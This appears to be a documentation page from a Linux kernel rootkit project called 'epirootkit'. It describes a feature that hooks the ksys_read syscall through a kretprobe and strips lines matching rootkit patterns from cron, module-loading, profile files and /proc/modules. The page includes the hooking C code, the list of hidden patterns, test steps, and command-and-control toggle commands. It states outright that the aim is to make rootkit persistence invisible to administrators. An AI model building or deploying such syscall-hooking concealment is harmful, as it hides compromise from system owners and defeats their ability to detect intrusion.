---
title: "Line Hiding"
description: "Hide rootkit lines from file contents using syscall interception"
icon: "edit"
date: "2025-05-30T00:00:00+01:00"
lastmod: "2025-05-30T00:00:00+01:00"
draft: false
toc: true
weight: 516
---

# Line Hiding

Hide lines containing rootkit patterns from file contents by intercepting read syscalls and filtering output in real-time.

## How It Works

1. **Hook `ksys_read`** using kretprobe
2. **Check file path** from file descriptor  
3. **Filter target files** line-by-line
4. **Remove pattern matches** and adjust return size

## Implementation

```c
line_hiding_state.read_probe = (struct kretprobe) {
    .kp.symbol_name = "ksys_read",
    .handler = read_ret_handler,
    .entry_handler = read_entry_handler,
    .maxactive = 50
};

static int read_ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    if (should_filter_file(ctx->filepath)) {
        copy_from_user(kernel_buffer, ctx->user_buffer, ret_value);
        filtered_size = filter_file_lines(kernel_buffer, ret_value);
        copy_to_user(ctx->user_buffer, kernel_buffer, filtered_size);
        regs_set_return_value(regs, filtered_size);
    }
}
```

## Target Configuration

### Directories
- `/etc/cron.d/` - Cron job definitions
- `/etc/modules-load.d/` - Module loading configs
- `/etc/profile.d/` - Shell profile scripts  
- `/proc/modules` - Loaded kernel modules

### Hidden Patterns
```c
static const char * const hide_line_patterns[] = {
    "epirootkit",
    "jules_est_bo_",
    "EpiRootkit", 
    "modprobe epirootkit",
    "insmod epirootkit"
};
```

## Testing

### Test File
```bash
# Use provided test file
sudo cp test_line_hiding_epirootkit.txt /etc/cron.d/test_epirootkit

# View filtered content
cat /etc/cron.d/test_epirootkit
```

**Result**: 24 lines → ~9 lines (rootkit patterns filtered automatically)

### Example Output
```bash
# Normal lines visible
* * * * * root /usr/bin/legitimate_cron_job.sh
0 2 * * * root /usr/bin/backup_script.sh
15 3 * * 0 root /usr/bin/weekly_cleanup.sh

# Lines with 'epirootkit' patterns are hidden

30 1 * * * root /usr/bin/system_update.sh
45 23 * * * root /usr/bin/cleanup_logs.sh
```

## Usage

### WebUI Control
**[Configuration Panel](../../04-web-ui/features/panels/configuration-panel.md)** provides line hiding toggle with real-time status.

### C2 Commands
```bash
# Toggle line hiding
enable-line-hiding Client-1
disable-line-hiding Client-1

# Check status
status Client-1
```

## Security Impact

Makes rootkit persistence invisible to administrators reading system configuration files, effectively hiding:
- Cron job installations
- Module loading configurations
- Shell profile modifications
- Kernel module presence
